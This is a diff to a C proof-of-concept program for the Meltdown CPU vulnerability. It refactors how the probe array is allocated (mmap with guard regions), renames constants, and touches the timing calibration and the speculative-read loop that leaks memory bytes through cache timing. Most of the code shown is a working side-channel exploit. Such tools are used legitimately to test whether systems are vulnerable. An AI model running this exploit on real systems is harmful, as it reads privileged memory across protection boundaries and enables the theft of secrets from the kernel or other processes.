@@ -34,6 +34,8 @@
  * https://meltdownattack.com/
  */
 
+#include <sys/mman.h>
+
 #include <err.h>
 #include <limits.h>
 #include <setjmp.h>
@@ -43,8 +45,6 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-
-#define SHIFT	12
 
 /*
  * Assembler functions
@@ -78,7 +78,11 @@ static size_t len;
 /*
  * Probe array
  */
-static uint8_t probe[256 * (1 << SHIFT)];
+#define PROBE_SHIFT	12
+#define PROBE_LINELEN	(1 << PROBE_SHIFT)
+#define PROBE_NLINES	256
+#define PROBE_SIZE	(PROBE_NLINES * PROBE_LINELEN)
+static uint8_t *probe;
 
 /*
  * Average measured read latency with cold and hot cache
@@ -97,10 +101,33 @@ static uint64_t threshold;
 static uint8_t selftest[4096];
 
 /*
+ * Map our probe array between two guard regions to be absolutely sure
+ * that it is not adjacent to memory in use elsewhere in the program.
+ */
+#ifndef MAP_GUARD
+#define MAP_GUARD	MAP_ANON
+#endif
+static void
+init_probe(void)
+{
+	void *guard;
+
+	if (mmap(NULL, PROBE_SIZE, PROT_NONE, MAP_GUARD, -1, 0) == MAP_FAILED)
+		err(1, "mmap()");
+	probe = mmap(NULL, PROBE_SIZE, PROT_READ | PROT_WRITE,
+	    MAP_ANON | MAP_PRIVATE, -1, 0);
+	if (probe == MAP_FAILED)
+		err(1, "mmap()");
+	memset(probe, 0xff, PROBE_SIZE);
+	if (mmap(NULL, PROBE_SIZE, PROT_NONE, MAP_GUARD, -1, 0) == MAP_FAILED)
+		err(1, "mmap()");
+}
+
+/*
  * Compute the average hot and cold read latency and derive the decision
  * threshold.
  */
-#define N 1048576
+#define CAL_ROUNDS	1048576
 static void
 calibrate(void)
 {
@@ -112,9 +139,9 @@ calibrate(void)
 	min = UINT64_MAX;
 	max = 0;
 	sum = 0;
-	for (unsigned int i = 0; i < N + 2; ++i) {
-		clflush(&probe);
-		meas = timed_read(&probe);
+	for (unsigned int i = 0; i < CAL_ROUNDS + 2; ++i) {
+		clflush(probe);
+		meas = timed_read(probe);
 		if (meas < min)
 			min = meas;
 		if (meas > max)
@@ -123,16 +150,16 @@ calibrate(void)
 	}
 	sum -= min;
 	sum -= max;
-	avg_cold = sum / N;
+	avg_cold = sum / CAL_ROUNDS;
 	warnx("average cold read: %llu", (unsigned long long)avg_cold);
 
 	/* compute average latency of "hot" access */
-	meas = timed_read(&probe);
+	meas = timed_read(probe);
 	min = UINT64_MAX;
 	max = 0;
 	sum = 0;
-	for (unsigned int i = 0; i < N + 2; ++i) {
-		meas = timed_read(&probe);
+	for (unsigned int i = 0; i < CAL_ROUNDS + 2; ++i) {
+		meas = timed_read(probe);
 		if (meas < min)
 			min = meas;
 		if (meas > max)
@@ -141,7 +168,7 @@ calibrate(void)
 	}
 	sum -= min;
 	sum -= max;
-	avg_hot = sum / N;
+	avg_hot = sum / CAL_ROUNDS;
 	warnx("average hot read: %llu", (unsigned long long)avg_hot);
 
 	/* set decision threshold to the average of the two */
@@ -213,11 +240,11 @@ meltdown(void)
 	sigsegv = signal(SIGSEGV, sighandler);
 	for (i = 0; i < len; ++i) {
 		line[i % 16] = 0;
-		rflush(probe, 256, 1 << SHIFT);
+		rflush(probe, PROBE_NLINES, PROBE_LINELEN);
 		if ((signo = sigsetjmp(jmpenv, 1)) == 0)
-			spec_read(&addr[i], probe, SHIFT);
-		for (j = 0; j < 256; ++j) {
-			uint64_t delta = timed_read(&probe[j << SHIFT]);
+			spec_read(&addr[i], probe, PROBE_SHIFT);
+		for (j = 0; j < PROBE_NLINES; ++j) {
+			uint64_t delta = timed_read(&probe[j * PROBE_LINELEN]);
 			if (delta < threshold) {
 				line[i % 16] = j;
 				break;
@@ -296,8 +323,8 @@ main(int argc, char *argv[])
 		for (unsigned int i = 0; i < sizeof selftest; ++i)
 			selftest[i] = ~(uint8_t)(i % 255);
 
-	/* ensure that the probe array is paged in */
-	memset(probe, 0xff, sizeof probe);
+	/* create the probe array and ensure that it is paged in */
+	init_probe();
 
 	/* calibrate our timer */
 	calibrate();
